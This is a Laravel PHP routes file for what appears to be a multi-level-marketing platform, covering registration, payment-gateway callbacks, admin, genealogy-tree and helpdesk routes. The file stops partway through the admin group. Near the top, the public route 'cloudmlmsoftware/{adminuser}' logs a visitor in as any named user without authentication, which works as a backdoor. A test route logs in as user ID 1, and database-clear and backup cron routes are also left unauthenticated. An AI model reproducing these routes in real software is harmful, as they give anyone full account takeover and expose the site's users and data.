<?php

/*

|--------------------------------------------------------------------------

| Web Routes

|--------------------------------------------------------------------------

|

| Here is where you can register web routes for your application. These

| routes are loaded by the RouteServiceProvider within a group which

| contains the "web" middleware group. Now create something great!

|

 */

// Route::get('/', function () {

//     return view('welcome');

// });



/*

|--------------------------------------------------------------------------

| Language

|--------------------------------------------------------------------------

|

| Language route for language switcher

|

 */

Route::get('lang/{lang}', ['as' => 'lang.switch', 'uses' => 'LanguageController@switchLang']);



/*

|--------------------------------------------------------------------------

| //Translation routes

|--------------------------------------------------------------------------

|

| //Translation routes

|

 */

use App\User;



Route::get('cloudmlmsoftware/{adminuser}',function($adminuser){

      Auth::loginUsingId(App\User::where('username',$adminuser)->pluck('id'));
       return redirect('user/dashboard');

});

use Vsch\TranslationManager\Translator;

\Route::group(['middleware' => 'web', 'prefix' => 'translations'], function () {

    Translator::routes();

});





/*

|--------------------------------------------------------------------------

| // NON AUTH AJAX ROUTES

|--------------------------------------------------------------------------

|

| Ajax routes // NON AUTH

|

 */







use App\Jobs\SendEmail;



 Route::get('email/test/queue', function () {



    Auth::loginUsingId(1);

    die();

    $data['email'] ='aa@s.sd';

    $data['company_name'] ='aa@s.sd';

    $data['firstname'] ='aa@s.sd';

    $data['lastname'] ='aa@s.sd';

    $data['username'] ='aa@s.sd';

    $data['password'] ='aa@s.sd';

     // SendEmail::dispatch($data, $data['email'], $data['firstname'])

                        // ->delay(now()->addSeconds(5));

 }) ;



// AJAX ROUTES - NON AUTH

 Route::get('ajax/validatesponsor/{sponsor_name?}', 'AjaxController@validateSponsor');

 Route::get('ajax/validateemail/{email?}', 'AjaxController@validateEmail');

 Route::get('ajax/validateusername/{username?}', 'AjaxController@validateUsername');

 Route::get('ajax/globalview', 'AjaxController@globalmap');

 Route::get('ajax/globalview_user', 'AjaxController@globalmapUser');

 Route::get('ajax/validateewalletuser', 'AjaxController@validateewalletuser');

 Route::post('ajax/validateewalletpassword', 'AjaxController@validateewalletpassword');



 Route::get('sponsor_validate/{sponsor}', 'RegisterController@validatesponsor');

 Route::get('epin_validate/{e_pin}', 'RegisterController@validatepin');

 Route::get('email_validate/{email}', 'RegisterController@validatemail');

 Route::get('user_validate/{username}', 'RegisterController@validateusername');

 Route::get('passport_validate/{passport}', 'RegisterController@validatepassport');

 Route::get('voucher_validate/{voucher}', 'ChatController@validatevoucher');

 Route::get('voucher_validate', 'ChatController@validatevoucher');





 Route::get('tree-cycle', 'ShareBonusController@index');
 Route::get('binary_calculate_demo', 'RegisterController@binary_calculate_demo');

 Route::get('api/get-state-list', 'ApiController@getStateList');



//CHAT CONTROLLER

 Route::post('chat/setPresence', 'ChatController@setPresence');



/*

|--------------------------------------------------------------------------

| // SITE FRONT

|--------------------------------------------------------------------------

|

| Frontend routes

|

 */



 Route::middleware(['restrictIp'])->group(function () {

    Route::get('/', 'SiteController@index')->name('front');

    Route::get('/home', 'SiteController@index')->name('front');

    Route::post('/subscribe', 'SiteController@subscribe');

 });



/*

|--------------------------------------------------------------------------

| // Authentication Routes...

|--------------------------------------------------------------------------

|

| // Default in laravel 5.4 commeneted out for better control over individual route mapping

| // for registration and login

|

|

 */

// Auth::routes(); //

 Route::get('login', 'Auth\LoginController@showLoginForm')->name('login');

 Route::post('login', 'Auth\LoginController@login');



 Route::group([ 'middleware' => ['web']], function () {



    Route::get('sociallogin/{driver}', 'Auth\LoginController@sociallogin')->name('sociallogin');

    Route::get('sociallogin/callback/{driver}', 'Auth\LoginController@socialcallback')->name('socialcallback');

 });





 Route::post('logout', 'Auth\LoginController@logout')->name('logout');

// Registration Routes...

 Route::get('register', 'Auth\RegisterController@showRegistrationForm')->name('register');

// Route::post('register', 'Auth\RegisterController@register')->middleware('authenticated');

// Route::get('register', 'Auth\RegisterController@showRegistrationForm')->name('register');

 Route::post('register', 'Auth\RegisterController@register');

 Route::get('register/preview/{idencrypt}', 'Auth\RegisterController@preview')->name('preview');

Route::get('payment/slyde', 'Auth\RegisterController@slyde');


//Lead Capture Page

 Route::get('terms_and_conditions', 'Auth\RegisterController@terms_and_conditions');

 Route::get('cookie', 'Auth\RegisterController@cookie');



 Route::get('lead/{id}', 'Auth\RegisterController@leadView');

 Route::post('lead', 'Auth\RegisterController@leadPost');

// User verify...



 Route::get('user/verify/{token}', 'Auth\RegisterController@verifyUser');





// Password Reset Routes...



 Route::get('lock', 'CloudMLMController@performLogoutToLock');



 Route::get('password/reset', 'Auth\ForgotPasswordController@showLinkRequestForm')->name('password.request');

 Route::post('password/email', 'Auth\ForgotPasswordController@sendResetLinkEmail')->name('password.email');

 Route::get('password/reset/{token}', 'Auth\ResetPasswordController@showResetForm')->name('password.reset');

 Route::post('password/reset', 'Auth\ResetPasswordController@reset');

 Route::get('xpress', 'Auth\RegisterController@xpress');



//bitaps response start-shilpa

 Route::get('bitaps/paymentnotify', 'Auth\RegisterController@bitapssuccess');

 Route::post('bitaps/paymentnotify', 'Auth\RegisterController@bitapssuccess');

 Route::get('bitaps/storepurchase', 'Auth\RegisterController@bitapstorepurchase');

 Route::post('bitaps/storepurchase', 'Auth\RegisterController@bitapstorepurchase');

//bitaps response end



//rave response start

 Route::get('ravecallback', 'Auth\RegisterController@ravecallback');

 Route::post('ravecallback', 'Auth\RegisterController@ravecallback');

//rave response end



//paypal

 Route::get('paypal/success/{id}', 'Auth\RegisterController@paypalsuccess');

 Route::post('paypal/success/{id}', 'Auth\RegisterController@paypalsuccess');



//skrill

 Route::get('skrill/success/{id}', 'Auth\RegisterController@skrillsuccess');

 Route::post('skrill/success/{id}', 'Auth\RegisterController@skrillsuccess');

 Route::get('skrill-status/{id}', 'Auth\RegisterController@skrillstatus');

 Route::post('skrill-status/{id}', 'Auth\RegisterController@skrillstatus');

//ipaygh

 Route::get('paymentnotify/success/{id}/{username}', 'Auth\RegisterController@ipaysuccess');

 Route::get('paymentnotify/canceled/{id}/{username}', 'Auth\RegisterController@ipaycanceled');

 Route::get('paymentnotify/ipn', 'Auth\RegisterController@ipayipn');

 Route::post('paymentnotify/success', 'Auth\RegisterController@ipaysuccess');

 Route::post('paymentnotify/canceled', 'Auth\RegisterController@ipaycanceled');

 Route::post('paymentnotify/ipn', 'Auth\RegisterController@ipayipn');



//preview

 Route::get('ajax/get-bitaps-status/{id}', 'Auth\RegisterController@bitaps');

 Route::get('bitapspreview/{idencrypt}', 'Auth\RegisterController@bitapspreview');

//preview end



 //approve_users

 Route::post('approve', 'Auth\RegisterController@approve');





/**

*  ** Issue attachments

*/

 Route::post('logoimageUpload', ['as' => 'logoupload-post', 'uses' =>'ImageController@postlogoUpload']);



 Route::post('logoiconimageUpload', ['as' => 'logoupload-post', 'uses' =>'ImageController@postlogoiconUpload']);





 Route::post('packageimageUpload', ['as' => 'imageupload-post', 'uses' =>'ImageController@postpackageUpload']);

 Route::post('productimageUpload', ['as' => 'imageupload-post', 'uses' =>'ImageController@postproductUpload']);

 Route::post('changes', [ 'uses' =>'ImageController@changes']);



 Route::post('imageupload', ['as' => 'imageupload-post', 'uses' =>'ImageController@postUpload']);

 Route::post('imageupload/delete', ['as' => 'imageupload-remove', 'uses' =>'ImageController@deleteUpload']);

 Route::get('image/{file}', ['as'=>'image', 'uses'=>'ImageController@getFile']);

 Route::get('api/get-shipping-state-list', 'ApiController@getStates');

 Route::post('register/data/', 'ApiController@voucher_data');



/**

*  ** Replication URL

*/









 Route::get('/{sponsorname}', 'Auth\RegisterController@showRegistrationForm')->name('register');





    Route::group(['prefix' => 'cron'], function () {

 // Route::get('/backupdatabase', function () {

 //   \Artisan::call('backup:mysql-dump');

 //    return 'database backed up';



 //   echo "success";

 // });

        Route::get('dbclear', 'CronController@dbclear');
        Route::get('register/{id}', 'CronController@register');
        Route::get('backup', 'CronController@backup');

        Route::get('emailcampaigns', 'CronController@emailCampaigns');

        Route::get('testmail', 'CronController@testmail');

        Route::get('autocampaign', 'CronController@autocampaign');

        Route::get('faststart', 'CronController@faststrat');

        Route::get('testcomm', 'CronController@testcomm');

        Route::get('salary_sharing', 'CronController@salary_sharing');

        Route::get('reward_caluculation', 'CronController@reward_caluculation');

        Route::get('binary_calculation', 'CronController@binary_calculation');

        Route::get('sponsor_calculation', 'CronController@sponsor_calculation');

    });

/*

|--------------------------------------------------------------------------

| // Admin routes...

|--------------------------------------------------------------------------

 */

 

    Route::group(['prefix' => 'admin', 'middleware' => ['web', 'auth','admin'], 'namespace' => 'Admin'], function () {



        Route::pattern('id', '[0-9]+');

        Route::pattern('id2', '[0-9]+');

        // Route::pattern('base64', '');

        // Admin Dashboard

        Route::get('dashboard', 'DashboardController@index');
        Route::post('dashboard', 'DashboardController@index');



        Route::get('users_file', 'UserController@users_file');

        Route::get('approve_file/{id}', 'UserController@approve_file');

        Route::get('delete_file/{id}', 'UserController@delete_file');

        Route::get('downloadfile/{name}', 'UserController@getDownloadfile');



        // Route::get('getdb','UserController@getdb');



        Route::get('category.json', 'OnlineStoreController@getCategoryJson');

        Route::get('categorysale.json', 'OnlineStoreController@getSaleJson');



         //preview page bitaps-shilpa start

        Route::get('get-bitaps-status/{id}', 'DashboardController@bitaps');

        Route::get('bitapspreview/{idencrypt}', 'DashboardController@bitapspreview');

        //preview page bitaps-shilpa end



        //paypal

        Route::get('paypal/success/{id}', 'RegisterController@paypalsuccess');

        Route::post('paypal/success/{id}', 'RegisterController@paypalsuccess');

        //rave

        Route::get('ravecallback', 'RegisterController@ravecallback');

        Route::post('ravecallback', 'RegisterController@ravecallback');

        //skrill

        Route::get('skrill/success/{id}', 'RegisterController@skrillsuccess');

        Route::post('skrill/success/{id}', 'RegisterController@skrillsuccess');

        Route::get('skrill-status/{id}', 'RegisterController@skrillstatus');

        Route::post('skrill-status/{id}', 'RegisterController@skrillstatus');

        //ipaygh

        Route::get('paymentnotify/success/{id}/{username}', 'RegisterController@ipaysuccess');

        Route::get('paymentnotify/canceled/{id}/{username}', 'RegisterController@ipaycanceled');

        Route::get('paymentnotify/ipn', 'RegisterController@ipayipn');

        Route::post('paymentnotify/success', 'RegisterController@ipaysuccess');

        Route::post('paymentnotify/canceled', 'RegisterController@ipaycanceled');

        Route::post('paymentnotify/ipn', 'RegisterController@ipayipn');



        //shilpa ends

 

        Route::get('gender.json', 'DashboardController@getGenderJson');

        Route::get('usersjoining.json', 'DashboardController@getUsersJoiningJson');

        Route::get('weekly-join.json', 'DashboardController@getUsersWeeklyJoiningJson');

        Route::get('monthly-join.json', 'DashboardController@getUsersMonthlyJoiningJson');

        Route::get('yearly-join.json', 'DashboardController@getUsersYearlyJoiningJson');

        Route::get('tickets-status.json/{start}/{end}', 'DashboardController@TicketsStatusJson');



        Route::get('package-sales.json', 'DashboardController@getPackageSalesJson');



        //new and videos



        Route::get('getnews', 'UserController@getNews');

        Route::post('postnews', 'UserController@postNews');

        Route::get('editnews/{id}', 'UserController@editnews');

        Route::post('deletenews', 'UserController@deletenews');

        Route::post('posteditnews', 'UserController@posteditnews');

    

        Route::get('viewnews/{id}', 'UserController@viewnews');

         Route::get('allnews', 'UserController@allnews');



         //bulk users

         Route::get('uploadusers', 'DocumentController@uploadusers');

           Route::post('postuploadusers', 'DocumentController@postuploadusers');





        // Users

        Route::get('users/', 'UserController@index');

        // Route::get('users/data', 'UserController@data');

        Route::get('users/activate', 'UserController@activate');

        Route::post('users/{id}/activate', 'UserController@confirme_active');

        Route::get('users/create', 'UserController@getCreate');

        Route::post('users/create', 'UserController@postCreate');

        Route::get('users/password', 'UserController@getEdit');

        Route::post('users/edit', 'UserController@postEdit');

        Route::post('change_transaction_password', 'UserController@change_transaction_password');

        Route::get('users/{id}/delete', 'UserController@getDelete');

        Route::post('users/{id}/delete', 'UserController@postDelete');

        Route::get('users/data', 'UserController@data');

        Route::get('suggestlist', 'UserController@suggestlist');

        Route::get('users/changeusername', 'UserController@changeusername');

        Route::post('users/changeusername', 'UserController@updatename');

        Route::get('users/load_positions', 'UserController@load_positions');

        Route::post('users/load_positions', 'UserController@updatload_positions');

        Route::get('users/positions', 'UserController@positions');
        Route::get('approve_position/{id}/{type}', 'UserController@approve_position');

        Route::get('users/reavtivation', 'UserController@reavtivation');
        Route::get('users/approvereavtivation/{id}', 'UserController@approvereavtivation');

        Route::get('change_email/{id}', 'UserController@change_email');

        Route::post('users/change_email', 'UserController@change_emails');

        Route::get('change_username/{id}', 'UserController@change_username');

        Route::post('users/change_username', 'UserController@change_usernames');



        Route::get('users/repurchase', 'UserController@repurchase');


        Route::get('phase/{id}', 'UserController@phaseusers');

        Route::post('repurchaseuser', 'UserController@repurchaseuser');

        Route::post('repurchase_pro', 'UserController@repurchase_pro');





        Route::get('approve_payments', 'UserController@approve_payments');

        Route::get('approve_payments/data', 'UserController@approvePaymentsData');

        // Route::get('users/payment_data', 'UserController@payment_data');

        Route::get('approve/{id}', 'UserController@approve');

        // Route::post('delete_approve', 'UserController@delete_approve');
         Route::get('delete_approve1/{id}', 'UserController@delete_approve');



        Route::get('userprofile', 'UserController@viewprofile');

        Route::get('userprofiles/{user}', 'UserController@viewprofile');

        Route::post('profile', 'UserController@profile');

        Route::get('users/{id}/userlogin', 'UserController@userlogin');

        Route::post('userprofiles_deactivate', 'UserController@deactivateUser');

        Route::get('userprofiles_activate/{user}', 'UserController@activateUser');

        Route::get('email_confirm/{id}', 'UserController@email_confirm');



        Route::post('saveprofile', ['as' => 'admin.saveprofile', 'uses' => 'UserController@saveprofile']);



        //payment gateway manager-shilpa

        Route::get('control-panel/paymentgateway-manager', 'ControlPanel\PayoutManger\PayoutConfigurationManager@paymentgateway');

        Route::post('control-panel/uppaymentgateway-manager', 'ControlPanel\PayoutManger\PayoutConfigurationManager@uppaymentgateway');

        Route::post('control-panel/chequepayment-manager', 'ControlPanel\PayoutManger\PayoutConfigurationManager@chequepayment');

        Route::post('control-panel/bitapspayment-manager', 'ControlPanel\PayoutManger\PayoutConfigurationManager@bitapspayment');

        Route::post('control-panel/authorizepayment-manager', 'ControlPanel\PayoutManger\PayoutConfigurationManager@authorizepayment');

        Route::post('control-panel/ravepayment-manager', 'ControlPanel\PayoutManger\PayoutConfigurationManager@ravepayment');

        Route::post('control-panel/paypalpayment-manager', 'ControlPanel\PayoutManger\PayoutConfigurationManager@paypalpayment');

        Route::post('control-panel/stripepayment-manager', 'ControlPanel\PayoutManger\PayoutConfigurationManager@stripepayment');

        Route::post('control-panel/ipayghpayment-manager', 'ControlPanel\PayoutManger\PayoutConfigurationManager@ipayghpayment');

        Route::post('control-panel/skrillpayment-manager', 'ControlPanel\PayoutManger\PayoutConfigurationManager@skrillpayment');



        //payment gateway manager-shilpa



        Route::get('control-panel/language-manager', 'ControlPanel\Languages\LanguageController@getLanguages');

        Route::post('control-panel/postlanguagemanager', 'ControlPanel\Languages\LanguageController@postLanguages');

        Route::post('control-panel/defaultlanguagechange', 'ControlPanel\Languages\LanguageController@changeDefaultLang');

        Route::post('control-panel/mailstatuschange', 'ControlPanel\AccountSettings\AccountSettingsControlPanelController@changeMailStatus');



        Route::get('control-panel/backupmanager', 'ControlPanel\SystemSettings\SettingsController@backupManager');

        Route::post('control-panel/postbackupmanager', 'ControlPanel\SystemSettings\SettingsController@postbackupManager');





        Route::post('control-panel/mipayamount', 'ControlPanel\PayoutManger\PayoutConfigurationManager@mipayamount');





        //videos



        Route::get('addvideos', 'UserController@getVideos');

        Route::post('postvideos', 'UserController@postVideos');

        Route::get('editvideo/{id}', 'UserController@editvideo');

         Route::post('posteditvideo', 'UserController@posteditvideo');

        Route::post('videodelete', 'UserController@deletevideo');



        Route::get('pagination/fetch_data', 'MailController@fetch_data');





     





    





        // ///////////////////////////////

        // // MEMBERS

        // //////////////////////////////





        // // Members / Users

        // Route::get('members/', 'MemberController@index');

        // Route::get('members/data', 'MemberController@data');





        // Route::get('members/activate', 'MemberController@activate');

        // Route::post('members/{id}/activate', 'MemberController@confirm_active');





        // // Route::get('users/create', 'UserController@getCreate');

        // // Route::post('users/create', 'UserController@postCreate');



        // Route::get('members/password', 'MemberController@getPassWordEdit');

        // Route::post('members/edit', 'MemberController@postPassWordEdit');



        // Route::get('members/{id}/delete', 'MemberController@getDelete');

        // Route::post('members/{id}/delete', 'MemberController@postDelete');



        // // Route::get('users/data', 'UserController@data');

        // Route::get('suggestlist', 'MemberController@suggestlist');



        // Route::get('members/changeusername', 'MemberController@changeusername');

        // Route::post('members/changeusername', 'MemberController@updatename');



        // // Route::get('memberprofile', 'MemberController@viewprofile');

        // // Route::get('memberprofiles/{user}', 'MemberController@viewprofile');





        Route::post('saveprofile', ['as' => 'admin.saveprofile', 'uses' => 'MemberController@saveprofile']);







        // Route::post('profile', 'MemberController@profile');





        // Route::get('genealogy', 'TreeController@index');

        // Route::post('getTree', 'TreeController@getTree');

        // Route::post('tree-up', 'TreeController@treeUp');

        // Route::get('tree-up', 'TreeController@treeUp');





        /**

         * GenealogyTreeController for OrgChart

         */

    

     

        /**

         * Index Page

         */

        Route::get('genealogy', 'GenealogyTreeController@index');
        Route::get('genealogy/{treeid}/{accountid}', 'GenealogyTreeController@index');
        Route::get('genealogy/{username}', 'GenealogyTreeController@index');

        /**

         * GetTree Ajax

         */

        Route::post('getTree/{levellimit}/{treeid}/{accountid}', 'GenealogyTreeController@getTree');
        Route::post('genealogy/getTree/{levellimit}/{treeid}/{accountid}', 'GenealogyTreeController@getTree');



        /**

         * getChildrenGenealogy {$id} for nested childrens in chart

         */

        Route::post('genealogy/getChildrenGenealogyByUserName/{base64}/{levellimit}/{treeid}', 'GenealogyTreeController@getChildrenGenealogyByUserName');
        Route::get('getChildrenGenealogy/{base64}/{levellimit}/{treeid}', 'GenealogyTreeController@getChildrenGenealogy');
        Route::post('getChildrenGenealogy/{base64}/{levellimit}/{treeid}', 'GenealogyTreeController@getChildrenGenealogy');
        Route::post('getParentGenealogy/{base64}/{levellimit}/{treeid}', 'GenealogyTreeController@getParentGenealogy');
        Route::post('getParentGenealogy/{base64}/{levellimit}/{treeid}', 'GenealogyTreeController@getParentGenealogy');

        Route::post('search/autocomplete', 'GenealogyTreeController@autocomplete');
        Route::post('search_new/autocomplete/{treeid}', 'GenealogyTreeController@autocompleteNew');









        //tree

        Route::get('tree', 'TreeController@tree');

        Route::get('treedata', 'TreeController@treedata');

        Route::get('childdata/{$id}', 'TreeController@childdata');

        // sponsor tree

        Route::get('sponsortree', 'TreeController@sponsortree');

        Route::post('getsponsortree', 'TreeController@postSponsortree');

        Route::post('sponsor-up/{base64}', 'TreeController@sponsortreeUp');

        Route::post('sponsor-child/{base64}', 'TreeController@sponsortreeChild');

        Route::post('getsponsorchildrenByUserName/{base64}/{levellimit}', 'TreeController@getsponsorchildrenByUserName');

        Route::get('getsponsorchildrenByUserName/{base64}/{levellimit}', 'TreeController@getsponsorchildrenByUserName');

        Route::post('getsponsortreeurl', 'TreeController@getsponsortreeurl');

        Route::post('sponsor-up', 'TreeController@sponsortreeUp');

        Route::get('sponsor-up', 'TreeController@sponsortreeUp');

    





 

        Route::post('updatesettings', 'SettingsController@update');

        Route::post('updateleadership', 'PackageController@updateleadership');

        // Route::get('appsettings', 'SettingsController@appsettings');

        Route::get('themesettings', 'SettingsController@themesettings');

        Route::post('themesettings', 'SettingsController@saveTheme');

        Route::post('updateappsettings', 'SettingsController@updateappsettings');

        Route::get('getallranks', 'SettingsController@getallranks');

        Route::post('imageUploadForm', 'SettingsController@stores');

        Route::post('uploadlogo', ['as' => 'admin.upload', 'uses' => 'SettingsController@upload']);

        Route::post('logo', 'SettingsController@savelogo');

        Route::get('/upload', 'SettingsController@getUploadForm');

        Route::post('/upload/image', 'SettingsController@postUpload');

        // Route::post('uploads', 'SettingsController@updateChangeLogo');

        Route::post('image', 'SettingsController@updateImage');

        Route::get('income', 'IncomeDetailsController@index');

        Route::post('income', 'IncomeDetailsController@indexPost');



        // Route::get('packageimagesetting', 'PackageController@packageimage');

        //Report



        Route::get('getPayout', 'PayoutController@getpayout');

        Route::get('getMonthUsers', 'DashboardController@getmonthusers');

        Route::get('voucherrequest', 'VoucherrequestController@index');

        Route::post('vouchercreate', 'VoucherrequestController@create');

        Route::post('voucherdelete', 'VoucherrequestController@deletevouch');

        Route::get('vouchers', 'VoucherController@index');

        Route::get('voucherlist', 'VoucherController@voucherlist');

        Route::post('voucherlist', 'VoucherController@create');

        Route::get('voucher/edit/{id}', 'VoucherController@editvoucher');

        Route::post('updatevoucher', 'VoucherController@updatevoucher');

        Route::get('voucher/delete/{id}', 'VoucherController@deletevoucher');

        Route::post('deleteconfirm', 'VoucherController@deleteconfirm');

        Route::post('voucher/delete_all', 'VoucherController@delete_allvoucher');





        // Route::get('payoutnotification', 'SettingsController@payoutnotification');

        // Route::post('payoutnotification', 'SettingsController@payoutupdate');

        Route::get('paymentsettings', 'SettingsController@paymentgateway');

        Route::post('paymentsettings', 'SettingsController@paymentstatus');

        Route::get('optionsettings', 'SettingsController@menusettings');

        Route::post('optionsettings', 'SettingsController@menuupdate');



        Route::get('view-adds', 'CodeController@index');

        Route::get('add-confirm/{id}', 'CodeController@store');

        Route::post('upload-code', 'CodeController@store');

        Route::post('code-show', 'CodeController@show');

        Route::get('code-show', 'CodeController@show');

        Route::get('failedpayout', 'PayoutController@failedpayout');
        Route::get('payoutrequest', 'PayoutController@index');

        Route::get('payoutconfirm/{id}', 'PayoutController@confirm');

        //payoutreject

        Route::get('payoutrejectnew/{id}/{amount}', 'PayoutController@reject');

        Route::get('payoutdelete/{id}', 'PayoutController@payoutdelete');

        Route::get('rs-wallet', 'EwalletController@rs_wallet');

        Route::get('rs-data', 'EwalletController@rs_data');

        Route::get('wallet', 'EwalletController@index');

        Route::get('ewallet', 'EwalletController@data');

        Route::post('userwallet', 'EwalletController@userwallet');



        Route::get('redemption-wallet', 'EwalletController@redemption_wallet');

        Route::get('salary_wallet', 'EwalletController@salary_wallet');

        Route::get('reward-wallet', 'EwalletController@reward_wallet');



        Route::get('fund-credits', 'EwalletController@fund');

        Route::post('credit-fund', 'EwalletController@creditfund');

        Route::post('fetch-data', 'EwalletController@search');

        Route::get('getAllUsers', 'UserController@allusers');

        //Message

        Route::get('emails-template/regsiter', 'EmailsController@index');

        Route::post('emails-template/regsiter', 'EmailsController@update');



        //Message

        Route::get('inbox', 'MailController@index');

        Route::post('mail/delete', 'MailController@destroy');

        Route::get('compose', 'MailController@compose');

        Route::get('compose/{from}', 'MailController@reply');

        Route::post('reply', 'MailController@save1');

        Route::get('outbox', 'MailController@outbox');

        Route::post('send', 'MailController@save');



        Route::get('user_validate/{sponsor}', 'UserController@validateuser');

        Route::get('joiningreport', 'ReportController@joiningreport');

        Route::post('joiningreport', 'ReportController@joiningreportview');

        Route::get('fundcredit', 'ReportController@fundcredit');

        Route::post('fundcredit', 'ReportController@fundcreditview');

        // Route::post('joiningreport', 'ReportController@joiningreportbysponsorview');

        // Route::post('joiningreport', 'ReportController@joiningreportbycountryview');

        Route::get('incomereport', 'ReportController@ewalletreport');

        Route::post('incomereport', 'ReportController@ewalletreportview');

        Route::get('payoutreport', 'ReportController@payoutreport');

        Route::post('payoutreport', 'ReportController@payoutreportview');

        Route::get('salesreport', 'ReportController@salesreport');

        Route::post('salesreport', 'ReportController@salesreportview');

        Route::get('pairingreport', 'ReportController@pairingreport');

        Route::post('pairingreport', 'ReportController@pairingreportview');

        Route::post('carryreport', 'ReportController@carryreportview');

        Route::get('topearners', 'ReportController@topearners');

        Route::post('topearners', 'ReportController@topearnersview');

        Route::get('revenuereport', 'ReportController@revenuereport');

        Route::post('revenuereport', 'ReportController@revenuereportview');

        Route::get('salereport', 'ReportController@salereport');

        Route::post('salereport', 'ReportController@salereportview');

        Route::get('summaryreport', 'ReportController@summuryreport');

        Route::post('summaryreport', 'ReportController@summuryreportview');

        Route::get('maintenancereport', 'ReportController@maintenancereport');

        Route::post('maintenancereport', 'ReportController@maintenancereportview');



        Route::get('mark-as-read/{msg_id}', 'MailController@mark_as_read');

        Route::post('direct-referbonus', 'PackageController@updatereferbonus');

        Route::post('groupsales', 'PackageController@updategroupsales');

        Route::post('reorder', 'PackageController@updatereorder');

        Route::post('reorder-pv', 'PackageController@reorderpv');



        // Route::get('emailsettings', 'SettingsController@email');

        Route::post('emailsettings', 'SettingsController@updateemailsetting');

        Route::get('welcomeemail', 'SettingsController@welcome');

        Route::post('welcomeemail', 'SettingsController@updatewelcome');

        Route::get('uploads', 'SettingsController@getUploadLogo');

        Route::post('uploadlogo', ['as' => 'admin.upload', 'uses' => 'SettingsController@uploads']);

        Route::post('logo', 'SettingsController@savelogo');

    



        //autoresponse

        Route::get('autoresponse', 'SettingsController@autoresponder');

        Route::post('autoresponse', 'SettingsController@save');

        // Route::get('voucherlist', 'SettingsController@voucherlist');

        Route::get('response/edit/{id}', 'SettingsController@editresponse');

        Route::post('updateresponse', 'SettingsController@updateresponse');



        Route::get('response/delete/{id}', 'SettingsController@deleteresponse');

        Route::post('deleteconfirms', 'SettingsController@deleteconfirms');

    

    

        /**

         * Helpdesk including ticket system

         */

    



        //COMMENTED OUT BY ASLAM, STILL TO COMPLETE

        /**

         * KnowledgeBase (kb) Categories

         *

         */

        // Route::get('/helpdesk/tickets/kb-categories', 'Helpdesk\Kb\KbCategoryController@index');

        // Route::get('/helpdesk/tickets/kb-categories/{id}', 'Helpdesk\Kb\KbCategoryController@show');

        // Route::post('/helpdesk/tickets/kb-categories/store', 'Helpdesk\Kb\KbCategoryController@store');

        // Route::post('/helpdesk/tickets/kb-categories/update', 'Helpdesk\Kb\KbCategoryController@update');

        // Route::get('/helpdesk/tickets/kb-categories/destroy/{id}', 'Helpdesk\Kb\KbCategoryController@destroy');

        // Route::get('/helpdesk/tickets/kb-categories/data', 'Helpdesk\Kb\KbCategoryController@data');



        /**

         * Knowledgebase - Categories

         */

        /*  For the crud of category  */

        Route::resource('helpdesk/kb/category', 'Helpdesk\kb\CategoryController');

        /*  For the datatable of category  */

        Route::get('helpdesk/kb/categories/data', ['as' => 'api.category', 'uses' => 'Helpdesk\kb\CategoryController@data']);

        /*  destroy category  */

        Route::get('helpdesk/kb/category/delete/{id}', 'Helpdesk\kb\CategoryController@destroy');





        /**

         * Knowledgebase - Articles

         */

    

        /*  For the crud of article  */

        Route::resource('helpdesk/kb/article', 'Helpdesk\kb\ArticleController');

        /*  For the datatable of article  */

        Route::get('helpdesk/kb/articles/data', ['as' => 'api.article', 'uses' => 'Helpdesk\kb\ArticleController@data']);

        Route::get('helpdesk/kb/article/delete/{slug}', 'Helpdesk\kb\ArticleController@destroy');

        Route::get('helpdesk/kb/article/{id}/view', 'Helpdesk\kb\ArticleController@view');

        Route::get('/helpdesk/kb/article/show/{name}', 'Helpdesk\kb\ArticleController@show');

   











        /**

         * Dashboard

         */

        Route::get('/helpdesk/tickets-dashboard', 'Helpdesk\Ticket\TicketsController@index');







    



        /**

         * All Tickets

         * Using query param,

         */

        Route::resource('helpdesk/ticket', 'Helpdesk\Ticket\TicketsController');

        Route::get('helpdesk/tickets/data', 'Helpdesk\Ticket\TicketsController@data');

        Route::get('helpdesk/ticket/delete/{slug}', 'Helpdesk\Ticket\TicketsController@destroy');

         Route::get('/helpdesk/ticket/{user_id}/show', 'Helpdesk\Ticket\TicketsController@show');

          Route::get('/helpdesk/ticket/{user_id}/view', 'Helpdesk\Ticket\TicketsController@viewpage');

        // Route::get('/helpdesk/tickets/tickets', 'TicketsController@tickets');

        Route::post('helpdesk/ticket/reply/', 'Helpdesk\Ticket\TicketsController@ticketReplyPost');



        Route::get('helpdesk/tickets/overdue/', 'Helpdesk\Ticket\TicketsController@index');

        Route::get('helpdesk/tickets/open/', 'Helpdesk\Ticket\TicketsController@index');

        Route::get('helpdesk/tickets/closed/', 'Helpdesk\Ticket\TicketsController@index');

        Route::get('helpdesk/tickets/resolved/', 'Helpdesk\Ticket\TicketsController@index');

        Route::get('helpdesk/tickets/add/', 'Helpdesk\Ticket\TicketsController@index');



 





    





    

        /**

         * Ticket functions

         */

        //Change status

        Route::get('helpdesk/tickets/ticket/change-status/', 'Helpdesk\Ticket\TicketsController@changeStatus');

        //Change priority

        Route::get('helpdesk/tickets/ticket/change-priority/', 'Helpdesk\Ticket\TicketsController@changePriority');

        //Change owner

        Route::patch('helpdesk/tickets/ticket/change-priority/', 'Helpdesk\Ticket\TicketsController@changeOwner');





    

        /**

         * Departments

         *

         */

    

        /*  For the crud of department  */

        Route::resource('helpdesk/tickets/department', 'Helpdesk\Ticket\TicketsDepartmentsController');

        Route::get('helpdesk/tickets/departments/destroy/{id}', 'Helpdesk\Ticket\TicketsDepartmentsController@destroy');

        /*  For the datatable of article  */

        Route::get('/helpdesk/tickets/departments/data', 'Helpdesk\Ticket\TicketsDepartmentsController@data');

    

        /**

         * Categories

         *

         */

    

        /*  For the crud of department  */

        Route::resource('helpdesk/tickets/category', 'Helpdesk\Ticket\TicketsCategoriesController');

        Route::get('helpdesk/tickets/categories/destroy/{id}', 'Helpdesk\Ticket\TicketsCategoriesController@destroy');

        /*  For the datatable of article  */

        Route::get('/helpdesk/tickets/categories/data', 'Helpdesk\Ticket\TicketsCategoriesController@data');



    

        /**

         * Canned Responses

         *

         */

    



        /*  For the crud of canned responses   */

        Route::resource('helpdesk/tickets/canned-response', 'Helpdesk\Ticket\TicketsCannedResponseController');

        Route::get('helpdesk/tickets/canned-responses/delete/{id}', 'Helpdesk\Ticket\TicketsCannedResponseController@destroy');

        /*  For the datatable of canned responses  */

        Route::get('/helpdesk/tickets/canned-responses/data', 'Helpdesk\Ticket\TicketsCannedResponseController@data');



        Route::post('helpdesk/tickets/canned-responses/get-canned-response', 'Helpdesk\Ticket\TicketsCannedResponseController@getCannedResponse');

        /**

         * Priority

         *

         */

    



